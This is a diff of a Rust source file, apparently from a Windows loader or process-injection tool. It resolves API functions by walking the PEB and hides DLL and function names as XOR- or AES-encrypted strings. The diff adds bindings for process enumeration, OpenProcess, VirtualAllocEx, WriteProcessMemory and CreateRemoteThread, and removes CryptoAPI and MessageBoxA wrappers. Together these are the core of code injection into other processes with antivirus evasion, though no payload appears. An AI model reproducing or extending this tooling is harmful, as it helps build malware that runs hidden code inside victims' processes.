@@ -1,13 +1,138 @@
 #![allow(non_snake_case)]
+#![allow(non_camel_case_types)]
 #![allow(unused)]
 
 use crate::consts::*;
 use crate::crypto_util::*;
 use crate::util::str_len;
-use crate::winternals::*;
 use std::arch::asm;
 use std::mem::size_of;
 use std::ptr::addr_of;
+use crate::windows::ntdll::*;
+
+//KERNEL32.DLL
+pub type LoadLibraryA = unsafe extern "system" fn(lpLibFileName: *const u8) -> usize;
+pub type GetLastError = unsafe extern "system" fn() -> u32;
+pub type GetProcAddress = unsafe extern "system" fn(hModule: usize, lpProcName: *const u8) -> usize;
+pub type FindResourceA =
+unsafe extern "system" fn(hModule: usize, lpName: usize, lptype: usize) -> usize;
+pub type LoadResource = unsafe extern "system" fn(hModule: usize, hResInfo: usize) -> usize;
+pub type LockResource = unsafe extern "system" fn(hResData: usize) -> *const u8;
+pub type SizeofResource = unsafe extern "system" fn(hModule: usize, hResInfo: usize) -> u32;
+pub type CreateToolhelp32Snapshot =
+unsafe extern "system" fn(dwFlags: u32, th32ProcessID: u32) -> usize;
+pub type Process32First =
+unsafe extern "system" fn(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> bool;
+pub type Process32Next =
+unsafe extern "system" fn(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> bool;
+pub type CloseHandle = unsafe extern "system" fn(hObject: usize) -> bool;
+pub type OpenProcess =
+unsafe extern "system" fn(dwDesiredAccess: u32, bInheritHandle: u32, dwProcessId: u32) -> usize;
+pub type NtFlushInstructionCache =
+unsafe extern "system" fn(hProcess: usize, lpBaseAddress: usize, dwSize: u32);
+pub type VirtualAllocEx = unsafe extern "system" fn(
+    hProcess: usize,
+    lpAddress: usize,
+    dwSize: usize,
+    flAllocationType: u32,
+    flProtect: u32,
+) -> usize;
+pub type VirtualAlloc = unsafe extern "system" fn(
+    lpAddress: usize,
+    dwSize: usize,
+    flAllocationType: u32,
+    flProtect: u32,
+) -> usize;
+pub type VirtualProtect = unsafe extern "system" fn(
+    lpAddress: usize,
+    dwSize: usize,
+    flNewProtect: u32,
+    lpflOldProtect: *mut u32,
+) -> bool;
+pub type WriteProcessMemory = unsafe extern "system" fn(
+    hProcess: usize,
+    lpAddress: usize,
+    lpBuffer: *const u8,
+    nSize: usize,
+    lpNumberOfBytesWritten: usize,
+) -> bool;
+pub type CreateRemoteThread = unsafe extern "system" fn(
+    hProcess: usize,
+    lpThreadAttributes: usize,
+    dwStackSize: usize,
+    lpStartAddress: usize,
+    lpParameter: usize,
+    dwCreationFlags: u32,
+    lpThreadId: *mut u32,
+) -> usize;
+pub type WaitForSingleObject =
+unsafe extern "system" fn(hProcess: usize, dwMilliseconds: u32) -> u32;
+
+pub const PROCESS_TERMINATE: u32 = 0x0001;
+pub const PROCESS_CREATE_THREAD: u32 = 0x0002;
+pub const PROCESS_SET_SESSIONID: u32 = 0x0004;
+pub const PROCESS_VM_OPERATION: u32 = 0x0008;
+pub const PROCESS_VM_READ: u32 = 0x0010;
+pub const PROCESS_VM_WRITE: u32 = 0x0020;
+pub const PROCESS_DUP_HANDLE: u32 = 0x0040;
+pub const PROCESS_CREATE_PROCESS: u32 = 0x0080;
+pub const PROCESS_SET_QUOTA: u32 = 0x0100;
+pub const PROCESS_SET_INFORMATION: u32 = 0x0200;
+pub const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
+pub const PROCESS_SUSPEND_RESUME: u32 = 0x0800;
+pub const PROCESS_QUERY_LIMITED_INFORMATION: u32 = 0x1000;
+pub const PROCESS_SET_LIMITED_INFORMATION: u32 = 0x2000;
+
+pub const MEM_COMMIT: u32 = 0x00001000;
+pub const MEM_RESERVE: u32 = 0x00002000;
+pub const MEM_REPLACE_PLACEHOLDER: u32 = 0x00004000;
+pub const MEM_RESERVE_PLACEHOLDER: u32 = 0x00040000;
+pub const MEM_RESET: u32 = 0x00080000;
+pub const MEM_TOP_DOWN: u32 = 0x00100000;
+pub const MEM_WRITE_WATCH: u32 = 0x00200000;
+pub const MEM_PHYSICAL: u32 = 0x00400000;
+pub const MEM_ROTATE: u32 = 0x00800000;
+pub const MEM_DIFFERENT_IMAGE_BASE_OK: u32 = 0x00800000;
+pub const MEM_RESET_UNDO: u32 = 0x01000000;
+pub const MEM_LARGE_PAGES: u32 = 0x20000000;
+pub const MEM_4MB_PAGES: u32 = 0x80000000;
+pub const MEM_64K_PAGES: u32 = MEM_LARGE_PAGES | MEM_PHYSICAL;
+pub const MEM_UNMAP_WITH_TRANSIENT_BOOST: u32 = 0x00000001;
+pub const MEM_COALESCE_PLACEHOLDERS: u32 = 0x00000001;
+pub const MEM_PRESERVE_PLACEHOLDER: u32 = 0x00000002;
+pub const MEM_DECOMMIT: u32 = 0x00004000;
+pub const MEM_RELEASE: u32 = 0x00008000;
+pub const MEM_FREE: u32 = 0x00010000;
+
+pub const PAGE_NOACCESS: u32 = 0x01;
+pub const PAGE_READONLY: u32 = 0x02;
+pub const PAGE_READWRITE: u32 = 0x04;
+pub const PAGE_WRITECOPY: u32 = 0x08;
+pub const PAGE_EXECUTE: u32 = 0x10;
+pub const PAGE_EXECUTE_READ: u32 = 0x20;
+pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+pub const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;
+pub const PAGE_GUARD: u32 = 0x100;
+pub const PAGE_NOCACHE: u32 = 0x200;
+pub const PAGE_WRITECOMBINE: u32 = 0x400;
+
+pub const TH32CS_SNAPPROCESS: u32 = 0x00000002;
+pub const INVALID_HANDLE_VALUE: usize = usize::MAX;
+pub const MAX_PATH: usize = 260;
+
+#[repr(C)]
+pub struct PROCESSENTRY32 {
+    pub dwSize: u32,
+    pub cntUsage: u32,
+    pub th32ProcessID: u32,
+    pub th32DefaultHeapID: usize,
+    pub th32ModuleID: u32,
+    pub cntThreads: u32,
+    pub th32ParentProcessID: u32,
+    pub pcPriClassBase: i32,
+    pub dwFlags: u32,
+    pub szExeFile: [u8; MAX_PATH],
+}
 
 pub unsafe fn get_peb() -> *const PEB {
     let mut peb = 0usize;
@@ -59,9 +184,9 @@ pub unsafe fn GetModuleHandle(sModuleName: Vec<u8>) -> usize {
 
         if &sModuleNameW[..]
             == std::slice::from_raw_parts(
-                (*pEntry).BaseDllName.Buffer,
-                ((*pEntry).BaseDllName.Length / 2) as usize,
-            )
+            (*pEntry).BaseDllName.Buffer,
+            ((*pEntry).BaseDllName.Length / 2) as usize,
+        )
         {
             return (*pEntry).DllBase;
         }
@@ -168,7 +293,7 @@ pub unsafe fn CreateToolhelp32Snapshot(dwFlags: u32, th32ProcessID: u32) -> usiz
             CREATETOOLHELP32SNAPSHOT_POS,
             CREATETOOLHELP32SNAPSHOT_LEN,
         )
-        .as_slice(),
+            .as_slice(),
     ));
 
     createToolhelp32Snapshot(dwFlags, th32ProcessID)
@@ -317,224 +442,7 @@ pub unsafe fn WaitForSingleObject(hProcess: usize, dwMilliseconds: u32) -> u32 {
     waitForSingleObject(hProcess, dwMilliseconds)
 }
 
-pub unsafe fn CryptAcquireContextW(
-    phProv: *mut usize,
-    szContainer: usize,
-    szProvider: *const u16,
-    dwProvType: u32,
-    dwFlags: u32,
-) -> bool {
-    let cryptAcquireContextW: CryptAcquireContextW = std::mem::transmute(GetProcAddress(
-        GetModuleHandle(get_xor_encrypted_string(
-            ADVAPI32_DLL_POS,
-            ADVAPI32_DLL_KEY,
-            ADVAPI32_DLL_LEN,
-        )),
-        get_xor_encrypted_string(
-            CRYPTACQUIRECONTEXTW_POS,
-            CRYPTACQUIRECONTEXTW_KEY,
-            CRYPTACQUIRECONTEXTW_LEN,
-        )
-        .as_slice(),
-    ));
 
-    cryptAcquireContextW(phProv, szContainer, szProvider, dwProvType, dwFlags)
-}
-
-pub unsafe fn CryptCreateHash(
-    phProv: usize,
-    ALG_ID: u32,
-    hKey: usize,
-    dwFlags: u32,
-    phHash: *mut usize,
-) -> bool {
-    let cryptCreateHash: CryptCreateHash = std::mem::transmute(GetProcAddress(
-        GetModuleHandle(get_xor_encrypted_string(
-            ADVAPI32_DLL_POS,
-            ADVAPI32_DLL_KEY,
-            ADVAPI32_DLL_LEN,
-        )),
-        get_xor_encrypted_string(
-            CRYPTCREATEHASH_POS,
-            CRYPTCREATEHASH_KEY,
-            CRYPTCREATEHASH_LEN,
-        )
-        .as_slice(),
-    ));
-
-    cryptCreateHash(phProv, ALG_ID, hKey, dwFlags, phHash)
-}
-
-pub unsafe fn CryptHashData(hHash: usize, pbData: *const u8, dwDataLen: u32, dwFlags: u32) -> bool {
-    let cryptHashData: CryptHashData = std::mem::transmute(GetProcAddress(
-        GetModuleHandle(get_xor_encrypted_string(
-            ADVAPI32_DLL_POS,
-            ADVAPI32_DLL_KEY,
-            ADVAPI32_DLL_LEN,
-        )),
-        get_xor_encrypted_string(CRYPTHASHDATA_POS, CRYPTHASHDATA_KEY, CRYPTHASHDATA_LEN)
-            .as_slice(),
-    ));
-
-    cryptHashData(hHash, pbData, dwDataLen, dwFlags)
-}
-
-pub unsafe fn CryptDeriveKey(
-    hHash: usize,
-    Algid: u32,
-    hBaseData: usize,
-    dwFlags: u32,
-    phKey: *mut usize,
-) -> bool {
-    let cryptDeriveKey: CryptDeriveKey = std::mem::transmute(GetProcAddress(
-        GetModuleHandle(get_xor_encrypted_string(
-            ADVAPI32_DLL_POS,
-            ADVAPI32_DLL_KEY,
-            ADVAPI32_DLL_LEN,
-        )),
-        get_xor_encrypted_string(CRYPTDERIVEKEY_POS, CRYPTDERIVEKEY_KEY, CRYPTDERIVEKEY_LEN)
-            .as_slice(),
-    ));
-
-    cryptDeriveKey(hHash, Algid, hBaseData, dwFlags, phKey)
-}
-
-pub unsafe fn CryptSetKeyParam(hKey: usize, dwParam: u32, pbData: *const u8, dwFlags: u32) -> bool {
-    let cryptSetKeyParam: CryptSetKeyParam = std::mem::transmute(GetProcAddress(
-        GetModuleHandle(get_xor_encrypted_string(
-            ADVAPI32_DLL_POS,
-            ADVAPI32_DLL_KEY,
-            ADVAPI32_DLL_LEN,
-        )),
-        get_xor_encrypted_string(
-            CRYPTSETKEYPARAM_POS,
-            CRYPTSETKEYPARAM_KEY,
-            CRYPTSETKEYPARAM_LEN,
-        )
-        .as_slice(),
-    ));
-
-    cryptSetKeyParam(hKey, dwParam, pbData, dwFlags)
-}
-
-pub unsafe fn CryptGetKeyParam(
-    hKey: usize,
-    dwParam: u32,
-    pbData: *mut u8,
-    pbDataLen: *mut u32,
-    dwFlags: u32,
-) -> bool {
-    let cryptGetKeyParam: CryptGetKeyParam = std::mem::transmute(GetProcAddress(
-        GetModuleHandle(get_xor_encrypted_string(
-            ADVAPI32_DLL_POS,
-            ADVAPI32_DLL_KEY,
-            ADVAPI32_DLL_LEN,
-        )),
-        get_xor_encrypted_string(
-            CRYPTGETKEYPARAM_POS,
-            CRYPTGETKEYPARAM_KEY,
-            CRYPTGETKEYPARAM_LEN,
-        )
-        .as_slice(),
-    ));
-
-    cryptGetKeyParam(hKey, dwParam, pbData, pbDataLen, dwFlags)
-}
-
-pub unsafe fn CryptDecrypt(
-    hKey: usize,
-    hHash: usize,
-    Final: u32,
-    dwFlags: u32,
-    pbData: *mut u8,
-    pdwDataLen: *mut u32,
-) -> bool {
-    let cryptDecrypt: CryptDecrypt = std::mem::transmute(GetProcAddress(
-        GetModuleHandle(get_xor_encrypted_string(
-            ADVAPI32_DLL_POS,
-            ADVAPI32_DLL_KEY,
-            ADVAPI32_DLL_LEN,
-        )),
-        get_xor_encrypted_string(CRYPTDECRYPT_POS, CRYPTDECRYPT_KEY, CRYPTDECRYPT_LEN).as_slice(),
-    ));
-
-    cryptDecrypt(hKey, hHash, Final, dwFlags, pbData, pdwDataLen)
-}
-
-pub unsafe fn CryptEncrypt(
-    hKey: usize,
-    hHash: usize,
-    Final: u32,
-    dwFlags: u32,
-    pbData: *mut u8,
-    pdwDataLen: *mut u32,
-    dwBufLen: u32,
-) -> bool {
-    let cryptEncrypt: CryptEncrypt = std::mem::transmute(GetProcAddress(
-        GetModuleHandle(get_xor_encrypted_string(
-            ADVAPI32_DLL_POS,
-            ADVAPI32_DLL_KEY,
-            ADVAPI32_DLL_LEN,
-        )),
-        get_xor_encrypted_string(CRYPTDECRYPT_POS, CRYPTDECRYPT_KEY, CRYPTDECRYPT_LEN).as_slice(),
-    ));
-
-    cryptEncrypt(hKey, hHash, Final, dwFlags, pbData, pdwDataLen, dwBufLen)
-}
-
-pub unsafe fn CryptReleaseContext(hProv: usize, dwFlags: u32) -> bool {
-    let cryptReleaseContext: CryptReleaseContext = std::mem::transmute(GetProcAddress(
-        GetModuleHandle(get_xor_encrypted_string(
-            ADVAPI32_DLL_POS,
-            ADVAPI32_DLL_KEY,
-            ADVAPI32_DLL_LEN,
-        )),
-        get_xor_encrypted_string(
-            CRYPTRELEASECONTEXT_POS,
-            CRYPTRELEASECONTEXT_KEY,
-            CRYPTRELEASECONTEXT_LEN,
-        )
-        .as_slice(),
-    ));
-
-    cryptReleaseContext(hProv, dwFlags)
-}
-
-pub unsafe fn CryptDestroyKey(hKey: usize) -> bool {
-    let cryptDestroyKey: CryptDestroyKey = std::mem::transmute(GetProcAddress(
-        GetModuleHandle(get_xor_encrypted_string(
-            ADVAPI32_DLL_POS,
-            ADVAPI32_DLL_KEY,
-            ADVAPI32_DLL_LEN,
-        )),
-        get_xor_encrypted_string(
-            CRYPTDESTROYKEY_POS,
-            CRYPTDESTROYKEY_KEY,
-            CRYPTDESTROYKEY_LEN,
-        )
-        .as_slice(),
-    ));
-
-    cryptDestroyKey(hKey)
-}
-
-pub unsafe fn CryptDestroyHash(hHash: usize) -> bool {
-    let cryptDestroyHash: CryptDestroyHash = std::mem::transmute(GetProcAddress(
-        GetModuleHandle(get_xor_encrypted_string(
-            ADVAPI32_DLL_POS,
-            ADVAPI32_DLL_KEY,
-            ADVAPI32_DLL_LEN,
-        )),
-        get_xor_encrypted_string(
-            CRYPTDESTROYHASH_POS,
-            CRYPTDESTROYHASH_KEY,
-            CRYPTDESTROYHASH_LEN,
-        )
-        .as_slice(),
-    ));
-
-    cryptDestroyHash(hHash)
-}
 
 pub unsafe fn GetLastError() -> u32 {
     let getLastError: GetLastError = std::mem::transmute(GetProcAddress(
@@ -547,16 +455,4 @@ pub unsafe fn GetLastError() -> u32 {
     ));
 
     getLastError()
-}
-
-pub unsafe fn MessageBoxA(hWnd: usize, lpText: *const u8, lpCaption: *const u8, uType: u32) -> u32 {
-    let messageBoxA: MessageBoxA = std::mem::transmute(GetProcAddress(
-        GetModuleHandle(get_aes_encrypted_resource_bytes(
-            USER32_DLL_POS,
-            USER32_DLL_LEN,
-        )),
-        get_aes_encrypted_resource_bytes(MESSAGEBOXA_POS, MESSAGEBOXA_LEN).as_slice(),
-    ));
-
-    messageBoxA(hWnd, lpText, lpCaption, uType)
 }
